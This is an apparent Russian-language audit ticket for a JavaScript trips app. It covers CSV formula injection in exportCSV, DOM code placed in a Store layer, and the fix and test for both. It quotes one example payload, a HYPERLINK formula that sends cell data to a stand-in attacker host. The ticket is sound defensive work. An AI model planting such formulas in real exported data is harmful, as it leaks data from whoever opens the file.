# 07 — CSV-инъекция + `exportCSV` нарушает границу Store/View

**Приоритет:** P1 · **Область:** Безопасность / архитектура · **Оценка:** 1 ч

## Проблема 1: формульная инъекция

`trips.store.js:130-152` экранирует только кавычки:

```js
`"${t.clientName.replace(/"/g, '""')}"`
```

Имя клиента `=HYPERLINK("http://attacker/"&A1,"OK")` уедет в CSV как формула. Excel
и LibreOffice выполнят её при открытии — классический CSV/formula injection. Вектор
реальный: имена клиентов приходят из мессенджеров копипастом, а файл потом открывает
бухгалтер.

## Проблема 2: нарушение собственного правила слоёв

`CLAUDE.md` фиксирует: «`*.store.js` — State и бизнес-логика (**ноль обращений к DOM**)».
Но `exportCSV` делает `document.createElement('a')`, `document.body.appendChild`,
`link.click()`, `URL.createObjectURL`. Это чистый View-код внутри Store — первое
нарушение архитектурного инварианта в проекте, и оно уже мешает: функцию нельзя
протестировать в Node без DOM, поэтому тестов на неё нет.

## Что сделать

1. Разделить на две части:
   - `TripsStore.toCSV(): string` — чистая функция, тестируемая в Node.
   - `TripsView` берёт строку и сам делает Blob + скачивание.
2. Экранировать опасный префикс:

```js
const csvCell = (v) => {
  const s = String(v ?? '');
  const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
  return `"${safe.replace(/"/g, '""')}"`;
};
```

3. Добавить BOM `﻿` в начало файла — иначе Excel ломает кириллицу в заголовках
   («Дата», «Клиент»).
4. Тест: имя `=1+1` на выходе даёт `"'=1+1"`, а не `"=1+1"`.

## Критерий приёмки

`npm test` содержит тест `toCSV` с формульным именем; в `*.store.js` нет ни одного
обращения к `document` (проверяется грепом в CI).
